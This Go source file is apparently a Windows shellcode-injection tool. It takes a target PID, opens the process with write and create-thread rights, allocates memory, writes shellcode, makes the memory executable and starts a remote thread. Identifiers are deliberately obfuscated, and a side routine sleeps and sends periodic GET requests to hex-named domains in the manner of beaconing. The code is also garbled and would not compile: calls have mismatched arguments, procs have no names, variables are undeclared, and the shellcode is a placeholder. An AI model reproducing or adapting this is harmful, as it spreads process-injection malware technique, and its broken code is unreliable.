package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var a5a5a5a5a5a5a5a5 = []int{2147483647, 4294967295, 65535, 1048575, 268435455}

func main() {
	var a1b2c3d4e5f6g7h8 = flag.Bool("verbose", false, "Enable verbose output")
	var a2b3c4d5e6f7g8h9 = flag.Bool("debug", false, "Enable debug output")
	var a3b4c5d6e7f8g9ha0 = flag.Int("pid", 0, "Process ID to inject shellcode into")
	flag.Parse()

	a3b4c5d6e7f8g9ha1(*a3b4c5d6e7f8g9ha0)
	a3b4c5d6e7f8g9ha1(*a2b3c4d5e6f7g8h9)
	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)

	shellcode, errShellcode := hex.DecodeString("123")
	a3b4c5d6e7f8g9ha2(errShellcode)
	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
	if *a2b3c4d5e6f7g8h9 {
		fmt.Println(fmt.Sprintf("[DEBUG] Getting a handle to Process ID (PID) %d...", *a3b4c5d6e7f8g9ha0))
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	var a5d7e8f9g0h1 windows.Proc
	var a6d8e9g0h2 windows.Proc
	var a7d9g0h3 windows.Proc
	var a8g0h4 windows.Proc
	a4b5c6d7e8f9g0h1(kernel32, &a5d7e8f9g0h1)
	a4b5c6d7e8f9g0h1(kernel32, &a6d8e9g0h2)
	a4b5c6d7e8f9g0h1(kernel32, &a7d9g0h3)
	a4b5c6d7e8f9g0h1(kernel32, &a8g0h4)

	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*a3b4c5d6e7f8g9ha0))

	a3b4c5d6e7f8g9ha2(errOpenProcess)
	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
	if *a2b3c4d5e6f7g8h9 {
		fmt.Println(fmt.Sprintf("[DEBUG] Calling VirtualAllocEx on PID %d...", *a3b4c5d6e7f8g9ha0))
	}

	a4b5c6d7e8f9g0h1(a4b5c6d7e8f9g0h2, pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	a4b5c6d7e8f9g0h1(a6d8e9g0h2, pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	a4b5c6d7e8f9g0h1(a7d9g0h3, pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	a4b5c6d7e8f9g0h1(a8g0h4, pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	_, _, a3b4c5d6e7f8g9ha3 := a7d9g0h3.Call(uintptr(pHandle), uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	a3b4c5d6e7f8g9ha2(a3b4c5d6e7f8g9ha3)

	a4b5c6d7e8f9g0h1(a5d7e8f9g0h1, pHandle, 0, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&a5d7e8f9g0h1)))
	a4b5c6d7e8f9g0h1(a5d7e8f9g0h1, pHandle, 0, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&a5d7e8f9g0h1)))
	a4b5c6d7e8f9g0h1(a5d7e8f9g0h1, pHandle, 0, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&a5d7e8f9g0h1)))

	_, _, a3b4c5d6e7f8g9ha4 := a8g0h4.Call(uintptr(pHandle), 0, 0, 0, 0, 0, 0)

	a3b4c5d6e7f8g9ha2(a3b4c5d6e7f8g9ha4)
	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
	if *a2b3c4d5e6f7g8h9 {
		fmt.Println(fmt.Sprintf("[DEBUG] Calling CloseHandle on PID %d...", *a3b4c5d6e7f8g9ha0))
	}

	a3b4c5d6e7f8g9ha2(windows.CloseHandle(pHandle))
	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
	if *a2b3c4d5e6f7g8h9 {
		fmt.Println(fmt.Sprintf("[-] Successfully closed the handle to PID %d", *a3b4c5d6e7f8g9ha0))
	}
	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
	a3b4c5d6e7f8g9ha1(*a2b3c4d5e6f7g8h9)
}

func a1b2c3d4e5f6g7h8(a1b2c3d4e5f6g7h8 int) {
	for a1b2c3d4e5f6g7h8 >= 0 {
		rand.Seed(time.Now().UnixNano())
		a1b2c3d4e5f6g7h8 = rand.Intn(a5a5a5a5a5a5a5a5[0])
		if a1b2c3d4e5f6g7h8 < 0 {
			a1b2c3d4e5f6g7h8 *= -1
		}
		for a1b2c3d4e5f6g7h8 >= 0 {
			rand.Seed(time.Now().UnixNano())
			a1b2c3d4e5f6g7h8 = rand.Intn(a5a5a5a5a5a5a5a5[1])
			if a1b2c3d4e5f6g7h8 < 0 {
				a1b2c3d4e5f6g7h8 *= -1
			}
			for a1b2c3d4e5f6g7h8 >= 0 {
				rand.Seed(time.Now().UnixNano())
				a1b2c3d4e5f6g7h8 = rand.Intn(a5a5a5a5a5a5a5a5[2])
				if a1b2c3d4e5f6g7h8 < 0 {
					a1b2c3d4e5f6g7h8 *= -1
				}
			}
		}
	}
	rand.Seed(time.Now().UnixNano())
	a3b4c5d6e7f8g9ha1 := rand.Intn(3)
	a4b5c6d7e8f9g0h1 := fmt.Sprintf("%02x", 0xa4)
	a5d7e8f9g0h1 := fmt.Sprintf("%02x", 0xa6)
	a6d8e9g0h2 := fmt.Sprintf("%02x", 0xa7)
	a7d9g0h3 := fmt.Sprintf("%02x", 0xa8)
	a8g0h4 := fmt.Sprintf("%02x", 0xa9)
	a5d8e9g0h1 := fmt.Sprintf("%02x", 0xaa)

	url := fmt.Sprintf("https://%s.com", a5d8e9g0h1)
	req, _ := http.NewRequest("GET", url, nil)
	go func(req *http.Request) {
		resp, err := http.DefaultClient.Do(req)
		a3b4c5d6e7f8g9ha2(err)
		resp.Body.Close()
	}(req)

	time.Sleep(5 * time.Minute)
	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
	a3b4c5d6e7f8g9ha3 = rand.Intn(100)
	a4b5c6d7e8f9g0h1 = fmt.Sprintf("%02x", 0xb4)
	a5d7e8f9g0h1 = fmt.Sprintf("%02x", 0xb5)
	a6d8e9g0h2 = fmt.Sprintf("%02x", 0xb6)
	a7d9g0h3 = fmt.Sprintf("%02x", 0xb7)
	a8g0h4 = fmt.Sprintf("%02x", 0xb8)

	url = fmt.Sprintf("https://%s.com", a7d9g0h3)
	req, _ = http.NewRequest("GET", url, nil)
	go func(req *http.Request) {
		resp, err := http.DefaultClient.Do(req)
		a3b4c5d6e7f8g9ha2(err)
		resp.Body.Close()
	}(req)

	time.Sleep(5 * time.Minute)
	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
	a3b4c5d6e7f8g9ha3 = rand.Intn(100)
	a4b5c6d7e8f9g0h1 = fmt.Sprintf("%02x", 0xc4)
	a5d7e8f9g0h1 = fmt.Sprintf("%02x", 0xc5)
	a6d8e9g0h2 = fmt.Sprintf("%02x", 0xc6)
	a7d9g0h3 = fmt.Sprintf("%02x", 0xc7)
	a8g0h4 = fmt.Sprintf("%02x", 0xc8)

	url = fmt.Sprintf("https://%s.com", a8g0h4)
	req, _ = http.NewRequest("GET", url, nil)
	go func(req *http.Request) {
		resp, err := http.DefaultClient.Do(req)
		a3b4c5d6e7f8g9ha2(err)
		resp.Body.Close()
	}(req)
}

func a4b5c6d7e8f9g0h1(a1b2c3d4e5f6g7h8 windows.LazyDLL, a2b3c4d5e6f7g8h9 *windows.Proc) {
	*a2b3c4d5e6f7g8h9 = a1b2c3d4e5f6g7h8.NewProc(a2b3c4d5e6f7g8h9.Name)
}

func a3b4c5d6e7f8g9ha2(a1b2c3d4e5f6g7h8 error) {
	if a1b2c3d4e5f6g7h8 != nil {
		log.Fatal(fmt.Sprintf("[!]Error: %s", a1b2c3d4e5f6g7h8))
	}
}

func a3b4c5d6e7f8g9ha1(a1b2c3d4e5f6g7h8, a2b3c4d5e6f7g8h9 bool) {
	if a1b2c3d4e5f6g7h8 && a2b3c4d5e6f7g8h9 {
		fmt.Println("[!]Error: Both verbose and debug flags are enabled")
	}
}